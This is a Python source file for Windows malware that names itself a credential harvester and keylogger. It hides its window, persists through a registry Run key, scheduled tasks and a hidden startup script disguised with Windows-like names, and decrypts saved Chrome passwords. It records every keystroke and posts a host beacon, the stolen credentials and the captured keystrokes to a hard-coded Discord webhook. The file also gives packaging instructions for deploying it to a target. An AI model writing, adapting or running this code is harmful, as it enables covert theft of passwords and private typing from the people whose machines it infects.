#!/usr/bin/env python3
"""
chromehound_app.py — Background Chrome Credential Harvester + Keylogger
Auto-startup, zero windows, zero awareness.
Run once → persists forever on every boot/login.

Dependencies (install once on target):
  pip install pycryptodomex pypiwin32 requests

Or bundle with PyInstaller for a single .exe (no Python needed on target):
  pyinstaller --onefile --noconsole --name ChromeHelper chromehound_app.py
"""

import os, sys, json, base64, sqlite3, shutil, time, threading, ctypes
import socket, getpass, subprocess, struct
from datetime import datetime
from pathlib import Path

# ═══════════════════════════════════════════════════════════════
WEBHOOK = "https://discord.com/api/webhooks/1525542643973623950/DTGBzliikTbhIKdVFM7qFB4VAGi335jk2STLiMYEKXh15UmGq9G_xqX6HVKi2FEjjjRP"
# ═══════════════════════════════════════════════════════════════


# ╔══════════════════════════════════════════════════════════════╗
# ║  PHASE 0 — STEALTH (hide immediately, before anything)      ║
# ╚══════════════════════════════════════════════════════════════╝

def vanish():
    """Hide all windows and detach from console."""
    ctypes.windll.kernel32.FreeConsole()
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

vanish()


# ╔══════════════════════════════════════════════════════════════╗
# ║  PHASE 1 — AUTO-STARTUP (persist before doing anything)     ║
# ╚══════════════════════════════════════════════════════════════╝

def install_autostart():
    """
    3 persistence layers — ensures it runs on every boot/login
    even if one mechanism is cleaned.
    """
    # Determine our own path
    if getattr(sys, 'frozen', False):
        my_path = sys.executable
    else:
        my_path = os.path.abspath(sys.argv[0])
    
    # Copy to a protected location (survives deletion of original)
    hidden_dir = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows"
    hidden_dir.mkdir(parents=True, exist_ok=True)
    hidden_path = str(hidden_dir / "WinSvcHost.exe")
    
    if my_path != hidden_path:
        try:
            shutil.copy2(my_path, hidden_path)
        except:
            hidden_path = my_path  # fallback to original
    
    # ─── LAYER 1: Registry RUN key ───
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, hidden_path)
        winreg.CloseKey(key)
    except:
        pass
    
    # ─── LAYER 2: Scheduled Task (survives registry cleanup) ───
    try:
        task_name = "MicrosoftWindowsUpdateTask"
        # Delete existing task first to avoid errors
        subprocess.run(
            f'schtasks /delete /tn "{task_name}" /f',
            shell=True, capture_output=True, timeout=5
        )
        # Create new task
        subprocess.run(
            f'schtasks /create /tn "{task_name}" /tr "{hidden_path}" '
            f'/sc ONLOGON /ru {getpass.getuser()} /f /it /delay 0000:10',
            shell=True, capture_output=True, timeout=10
        )
        # Also run every hour (persistence guardian)
        subprocess.run(
            f'schtasks /create /tn "{task_name}_Guard" /tr "{hidden_path}" '
            f'/sc HOURLY /ru {getpass.getuser()} /f /it',
            shell=True, capture_output=True, timeout=10
        )
    except:
        pass
    
    # ─── LAYER 3: Startup folder (VBS launcher) ───
    try:
        startup = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        startup.mkdir(parents=True, exist_ok=True)
        vbs_launcher = startup / "WindowsService.vbs"
        vbs_launcher.write_text(
            f'Set WshShell = CreateObject("WScript.Shell")\n'
            f'WshShell.Run "{hidden_path}", 0, False\n'
        )
        # Hide the VBS file
        subprocess.run(f'attrib +h "{vbs_launcher}"', shell=True, capture_output=True)
    except:
        pass
    
    return hidden_path

# Install autostart BEFORE doing anything else
MY_PATH = install_autostart()


# ╔══════════════════════════════════════════════════════════════╗
# ║  PHASE 2 — CHROME CREDENTIAL HARVESTER                      ║
# ╚══════════════════════════════════════════════════════════════╝

def get_master_key():
    """Extract Chrome's AES-256 master key from Local State file."""
    path = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Local State"
    if not path.exists():
        return None
    try:
        data = json.loads(path.read_text("utf-8"))
        raw = base64.b64decode(data["os_crypt"]["encrypted_key"])
        assert raw[:5] == b"DPAPI"
        import win32crypt
        return win32crypt.CryptUnprotectData(raw[5:], None, None, None, 0)[1]
    except:
        return None

def decrypt_pw(ciphertext, key):
    """Decrypt Chrome >=80 AES-GCM encrypted password."""
    try:
        from Cryptodome.Cipher import AES
    except:
        from Crypto.Cipher import AES
    try:
        nonce, ct, tag = ciphertext[3:15], ciphertext[15:-16], ciphertext[-16:]
        return AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag).decode()
    except:
        return None

def steal_all_creds(key):
    """Harvest EVERY saved credential from Chrome."""
    db = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
    if not db.exists():
        return []
    
    # Copy to temp (Chrome locks the original)
    tmp = Path(os.environ["TEMP"]) / f"ld_{os.getpid()}_{int(time.time())}.db"
    try:
        shutil.copy2(str(db), str(tmp))
    except:
        return []
    
    results = []
    try:
        conn = sqlite3.connect(str(tmp))
        c = conn.cursor()
        c.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_last_used DESC")
        for url, user, enc in c.fetchall():
            if not url or not enc:
                continue
            pw = decrypt_pw(enc, key)
            if pw:
                results.append({"url": url, "username": user, "password": pw})
        conn.close()
    except:
        pass
    try:
        tmp.unlink(missing_ok=True)
    except:
        pass
    return results


# ╔══════════════════════════════════════════════════════════════╗
# ║  PHASE 3 — KEYLOGGER                                        ║
# ╚══════════════════════════════════════════════════════════════╝

buffer = []
buffer_lock = threading.Lock()
shift_down = False
caps_down = False
running = True

def log(text):
    with buffer_lock:
        buffer.append(text)

def active_window_title():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
        b = ctypes.create_unicode_buffer(length)
        ctypes.windll.user32.GetWindowTextW(hwnd, b, length)
        return b.value or ""
    except:
        return ""

def keylog_sender(hostname):
    last_domain = ""
    while running:
        time.sleep(4)
        title = active_window_title()
        domain = ""
        for kw in ("chrome", "edge", "firefox", "brave", "opera", "browser", "mail", "outlook", "gmail"):
            if kw in title.lower():
                parts = title.split(" - ")
                domain = parts[0].strip() if parts else title
                if len(domain) > 30:
                    domain = domain[:30]
                break
        if domain and domain != last_domain:
            last_domain = domain
            log(f"\n── [{domain}] ──\n")
        
        with buffer_lock:
            if not buffer:
                continue
            content = "".join(buffer)
            buffer.clear()
        if content.strip():
            try:
                import requests
                requests.post(WEBHOOK, json={
                    "content": f"`{hostname[:8]}` `{datetime.now():%H:%M:%S}`\n```\n{content}\n```",
                    "username": f"KL-{hostname[:6]}"
                }, timeout=5)
            except:
                pass

def keylog_capture():
    global shift_down, caps_down
    prev = {}
    vk_list = list(range(0x08, 0xFF))
    while running:
        for vk in vk_list:
            try:
                import win32api
                state = win32api.GetAsyncKeyState(vk)
            except:
                continue
            pressed = (state & 0x8000) != 0
            was = prev.get(vk, False)
            if pressed and not was:
                prev[vk] = True
                if vk == 0x10:
                    shift_down = True
                if vk == 0x14:
                    caps_down = not caps_down
                if vk in (0x10, 0x11, 0x12, 0x14, 0x5B, 0x5C):
                    continue
                out = None
                names = {
                    0x08: "[BS]", 0x09: "[TAB]", 0x0D: "\n", 0x1B: "[ESC]",
                    0x20: " ", 0x2E: "[DEL]", 0x2D: "[INS]",
                    0x25: "[←]", 0x27: "[→]", 0x26: "[↑]", 0x28: "[↓]",
                    0x24: "[HOME]", 0x23: "[END]", 0x21: "[PGUP]", 0x22: "[PGDN]",
                    0x70: "[F1]", 0x71: "[F2]", 0x72: "[F3]", 0x73: "[F4]",
                    0x74: "[F5]", 0x75: "[F6]", 0x76: "[F7]", 0x77: "[F8]",
                    0x78: "[F9]", 0x79: "[F10]", 0x7A: "[F11]", 0x7B: "[F12]",
                }
                if vk in names:
                    out = names[vk]
                elif 0x41 <= vk <= 0x5A:
                    out = chr(vk) if (shift_down ^ caps_down) else chr(vk).lower()
                elif 0x30 <= vk <= 0x39:
                    special = ")!@#$%^&*("
                    out = special[vk - 0x30] if shift_down else str(vk - 0x30)
                elif vk == 0xBE:
                    out = "." if not shift_down else ">"
                elif vk == 0xBC:
                    out = "," if not shift_down else "<"
                elif vk == 0xBF:
                    out = "/" if not shift_down else "?"
                elif vk == 0xBA:
                    out = ";" if not shift_down else ":"
                elif vk == 0xDE:
                    out = "'" if not shift_down else '"'
                elif vk == 0xDB:
                    out = "[" if not shift_down else "{"
                elif vk == 0xDD:
                    out = "]" if not shift_down else "}"
                elif vk == 0xDC:
                    out = "\\" if not shift_down else "|"
                elif vk == 0xC0:
                    out = "`" if not shift_down else "~"
                elif vk == 0xBD:
                    out = "-" if not shift_down else "_"
                elif vk == 0xBB:
                    out = "=" if not shift_down else "+"
                if out:
                    log(out)
            elif not pressed and was:
                prev[vk] = False
                if vk == 0x10:
                    shift_down = False
        time.sleep(0.003)


# ╔══════════════════════════════════════════════════════════════╗
# ║  PHASE 4 — DISCORD EXFILTRATION                             ║
# ╚══════════════════════════════════════════════════════════════╝

def send_beacon(hostname, username):
    """Send startup notification with system info."""
    try:
        import requests
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        ip = "Unknown"
    try:
        import requests
        requests.post(WEBHOOK, json={
            "embeds": [{
                "title": "🔴 CHROME HOUND ACTIVE",
                "description": (
                    f"**Host:** `{hostname}`\n"
                    f"**User:** `{username}`\n"
                    f"**IP:** `{ip}`\n"
                    f"**PID:** `{os.getpid()}`\n"
                    f"**Path:** `{MY_PATH}`"
                ),
                "color": 0xED4245,
                "footer": {"text": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            }]
        }, timeout=5)
    except:
        pass

def send_creds_to_discord(creds, hostname, username):
    """Dump all harvested credentials to Discord via webhook."""
    if not creds:
        return
    
    header = f"🎯 **{len(creds)} credentials harvested from Chrome**\n`{hostname}` • `{username}`\n\n"
    
    # Build compact credential dump
    lines = []
    for c in creds[:500]:  # cap at 500 per wave
        lines.append(f"`{c['url'][:60]}` | `{c['username'][:30]}`:`{c['password'][:50]}`")
    
    body = header + "\n".join(lines)
    
    # Split into 1900-char chunks for Discord
    chunks = [body[i:i+1900] for i in range(0, len(body), 1900)]
    for chunk in chunks:
        try:
            import requests
            requests.post(WEBHOOK, json={
                "embeds": [{
                    "title": f"🔑 Chrome Dump — {hostname[:8]}",
                    "description": chunk,
                    "color": 0xFFA500,
                    "footer": {"text": f"{len(creds)} credentials • {datetime.now():%Y-%m-%d %H:%M:%S}"}
                }]
            }, timeout=5)
        except:
            pass
    
    # Also send a clean text summary
    summary = "\n".join(f"{c['url']}  |  {c['username']}:{c['password']}" for c in creds[:50])
    try:
        import requests
        requests.post(WEBHOOK, json={
            "content": f"📋 **Raw dump (first 50)**\n```\n{summary[:1800]}\n```",
            "username": f"CH-{hostname[:6]}"
        }, timeout=5)
    except:
        pass


# ╔══════════════════════════════════════════════════════════════╗
# ║  MAIN — TIE IT ALL TOGETHER                                 ║
# ╚══════════════════════════════════════════════════════════════╝

def main():
    hostname = socket.gethostname()
    username = getpass.getuser()
    
    # Start keylogger threads
    threading.Thread(target=keylog_capture, daemon=True).start()
    threading.Thread(target=keylog_sender, args=(hostname,), daemon=True).start()
    
    # Send startup beacon
    send_beacon(hostname, username)
    
    # Get Chrome master key once (it persists for the session)
    master_key = get_master_key()
    
    if master_key:
        # Initial credential dump
        creds = steal_all_creds(master_key)
        if creds:
            send_creds_to_discord(creds, hostname, username)
    else:
        # If Chrome isn't installed or key can't be extracted
        try:
            import requests
            requests.post(WEBHOOK, json={
                "embeds": [{
                    "title": "⚠️ No Chrome key found",
                    "description": f"**Host:** {hostname}\nChrome may not be installed or Chrome <80.",
                    "color": 0xFEE75C,
                }]
            }, timeout=5)
        except:
            pass
    
    # Harvest loop — check for new credentials periodically
    last_hash = ""
    while running:
        time.sleep(60)  # check every minute
        if master_key:
            creds = steal_all_creds(master_key)
            # Simple dedup check
            h = "|".join(f"{c['url']}{c['username']}{c['password']}" for c in creds[:20])
            if creds and h != last_hash:
                last_hash = h
                send_creds_to_discord(creds, hostname, username)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # Silent fail — never alert the user
        pass
